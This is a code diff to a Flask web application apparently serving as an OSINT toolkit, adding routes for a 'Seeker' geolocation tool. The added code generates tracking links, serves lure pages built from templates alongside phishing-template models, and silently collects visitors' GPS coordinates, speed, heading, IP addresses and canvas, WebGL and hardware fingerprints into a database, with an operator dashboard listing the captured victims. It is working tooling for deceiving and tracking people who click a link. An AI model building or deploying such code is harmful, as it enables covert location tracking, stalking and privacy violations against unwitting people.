@@ -1,13 +1,16 @@
 from app import app, db
-from flask import render_template, request, jsonify, flash, redirect, url_for, session
-from models import SearchHistory, Analytics, PhishingTemplate
+from flask import render_template, request, jsonify, flash, redirect, url_for, session, Response
+from models import SearchHistory, Analytics, PhishingTemplate, SeekerSession, SeekerLocation, SeekerDevice
 from osint_tools import OSINTTools
 from web_scraper import get_website_text_content
+from seeker_tool import SeekerTool
 from datetime import datetime, date
 import json
 import logging
+import secrets
 
 osint = OSINTTools()
+seeker = SeekerTool()
 
 @app.route('/')
 def index():
@@ -289,6 +292,194 @@ def update_analytics(search_type):
             count=1
         )
         db.session.add(analytics_record)
+
+# =============================================================================
+# SEEKER GEOLOCATION TOOL ROUTES
+# =============================================================================
+
+@app.route('/seeker')
+def seeker_dashboard():
+    """Seeker geolocation tool dashboard"""
+    # Get active sessions from database
+    active_sessions = db.session.query(SeekerSession).filter_by(status='active').all()
+    recent_sessions = db.session.query(SeekerSession).order_by(SeekerSession.created_at.desc()).limit(10).all()
+    
+    # Calculate stats
+    total_sessions = db.session.query(SeekerSession).count()
+    total_visits = db.session.query(SeekerSession).with_entities(db.func.sum(SeekerSession.visits)).scalar() or 0
+    total_locations = db.session.query(SeekerLocation).count()
+    
+    stats = {
+        'active_sessions': len(active_sessions),
+        'total_sessions': total_sessions,
+        'total_visits': total_visits,
+        'total_locations': total_locations
+    }
+    
+    templates = seeker.get_available_templates()
+    
+    return render_template('seeker_dashboard.html', 
+                         sessions=recent_sessions, 
+                         stats=stats, 
+                         templates=templates)
+
+@app.route('/seeker/create', methods=['POST'])
+def create_seeker_session():
+    """Create a new Seeker session"""
+    try:
+        session_name = request.form.get('session_name', '').strip()
+        template_name = request.form.get('template_name', '').strip()
+        
+        if not session_name or not template_name:
+            flash('Session name and template are required', 'error')
+            return redirect(url_for('seeker_dashboard'))
+        
+        # Generate session ID
+        session_id = secrets.token_urlsafe(16)
+        
+        # Create database record
+        new_session = SeekerSession(
+            id=session_id,
+            name=session_name,
+            template_name=template_name,
+            status='active'
+        )
+        
+        db.session.add(new_session)
+        db.session.commit()
+        
+        # Generate tracking link
+        base_url = request.host_url
+        tracking_link = f"{base_url}seeker/track/{session_id}/{template_name}"
+        
+        flash(f'Session created successfully! Tracking link: {tracking_link}', 'success')
+        return redirect(url_for('seeker_session_detail', session_id=session_id))
+        
+    except Exception as e:
+        db.session.rollback()
+        flash(f'Error creating session: {str(e)}', 'error')
+        return redirect(url_for('seeker_dashboard'))
+
+@app.route('/seeker/session/<session_id>')
+def seeker_session_detail(session_id):
+    """View details of a specific Seeker session"""
+    session_obj = db.session.query(SeekerSession).filter_by(id=session_id).first()
+    if not session_obj:
+        flash('Session not found', 'error')
+        return redirect(url_for('seeker_dashboard'))
+    
+    locations = db.session.query(SeekerLocation).filter_by(session_id=session_id).order_by(SeekerLocation.timestamp.desc()).all()
+    devices = db.session.query(SeekerDevice).filter_by(session_id=session_id).order_by(SeekerDevice.timestamp.desc()).all()
+    
+    tracking_link = f"{request.host_url}seeker/track/{session_id}/{session_obj.template_name}"
+    
+    return render_template('seeker_session.html', 
+                         session=session_obj, 
+                         locations=locations, 
+                         devices=devices,
+                         tracking_link=tracking_link)
+
+@app.route('/seeker/track/<session_id>/<template_name>')
+def seeker_tracking_page(session_id, template_name):
+    """Serve the tracking page for a specific session and template"""
+    session_obj = db.session.query(SeekerSession).filter_by(id=session_id).first()
+    if not session_obj or session_obj.status != 'active':
+        return "Session not found or inactive", 404
+    
+    # Get template HTML - use basic template for now
+    template_html = seeker.get_basic_template(template_name)
+    
+    # Replace placeholders in template
+    template_html = template_html.replace('/collect', f'/seeker/collect/{session_id}')
+    
+    return Response(template_html, mimetype='text/html')
+
+@app.route('/seeker/collect/<session_id>', methods=['POST'])
+def collect_seeker_data(session_id):
+    """Collect location and device data from tracking page"""
+    try:
+        session_obj = db.session.query(SeekerSession).filter_by(id=session_id).first()
+        if not session_obj:
+            return jsonify({'error': 'Session not found'}), 404
+        
+        data = request.get_json()
+        if not data:
+            return jsonify({'error': 'No data received'}), 400
+        
+        # Update visit count
+        session_obj.visits += 1
+        
+        # Save location data if provided
+        location_data = data.get('location')
+        if location_data:
+            location_record = SeekerLocation(
+                session_id=session_id,
+                latitude=location_data.get('latitude'),
+                longitude=location_data.get('longitude'),
+                accuracy=location_data.get('accuracy'),
+                altitude=location_data.get('altitude'),
+                speed=location_data.get('speed'),
+                heading=location_data.get('heading'),
+                ip_address=request.remote_addr
+            )
+            db.session.add(location_record)
+        
+        # Save device data if provided
+        device_data = data.get('device')
+        if device_data:
+            device_record = SeekerDevice(
+                session_id=session_id,
+                user_agent=device_data.get('userAgent'),
+                screen_resolution=device_data.get('screen'),
+                timezone=device_data.get('timezone'),
+                language=device_data.get('language'),
+                platform=device_data.get('platform'),
+                cpu_cores=device_data.get('cores'),
+                memory=device_data.get('memory'),
+                gpu=device_data.get('gpu'),
+                canvas_fingerprint=device_data.get('canvas'),
+                webgl_fingerprint=device_data.get('webgl'),
+                ip_address=request.remote_addr
+            )
+            db.session.add(device_record)
+        
+        db.session.commit()
+        return jsonify({'success': True}), 200
+        
+    except Exception as e:
+        db.session.rollback()
+        logging.error(f'Error collecting seeker data: {str(e)}')
+        return jsonify({'error': 'Internal server error'}), 500
+
+@app.route('/seeker/session/<session_id>/toggle')
+def toggle_seeker_session(session_id):
+    """Toggle session active/inactive status"""
+    session_obj = db.session.query(SeekerSession).filter_by(id=session_id).first()
+    if not session_obj:
+        flash('Session not found', 'error')
+        return redirect(url_for('seeker_dashboard'))
+    
+    session_obj.status = 'inactive' if session_obj.status == 'active' else 'active'
+    db.session.commit()
+    
+    status_text = 'activated' if session_obj.status == 'active' else 'deactivated'
+    flash(f'Session {status_text} successfully', 'success')
+    return redirect(url_for('seeker_session_detail', session_id=session_id))
+
+@app.route('/seeker/session/<session_id>/delete')
+def delete_seeker_session(session_id):
+    """Delete a Seeker session and all its data"""
+    session_obj = db.session.query(SeekerSession).filter_by(id=session_id).first()
+    if not session_obj:
+        flash('Session not found', 'error')
+        return redirect(url_for('seeker_dashboard'))
+    
+    # Delete the session (cascade will delete related records)
+    db.session.delete(session_obj)
+    db.session.commit()
+    
+    flash('Session deleted successfully', 'success')
+    return redirect(url_for('seeker_dashboard'))
 
 @app.errorhandler(404)
 def not_found_error(error):
